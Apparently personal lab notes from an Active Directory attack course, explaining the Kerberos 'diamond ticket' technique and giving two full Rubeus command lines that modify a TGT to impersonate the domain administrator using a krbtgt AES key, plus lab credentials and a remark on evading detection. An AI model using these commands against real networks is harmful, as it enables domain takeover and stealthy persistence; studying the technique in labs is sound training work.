A diamond ticket is created by decrypting a valid TGT, making changes to
it and re-encrypt it using the AES keys of the krbtgt account. **This is a ticket repackaging attack**

Once again, the persistence lifetime depends on krbtgt account.
A diamond ticket is more **OPSEC** safe as it has a valid ticket times because a TGT issued by the DC is modified

Golden ticket was a **TGT forging attack** whereas diamond ticket is a TGT
modification attack

We would still need `krbtgt` AES keys to create a diamond ticket like so. Note that RC4 or AES keys of the user can be used
too):
```powershell
Loader.exe -path Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:student548 /password:cAyF6wTLSydnL2M7 /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

We could also use `/tgtdeleg` option in place of credentials in case we're running it as a domain user
```powershell
Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

![[Pasted image 20250510210937.png]]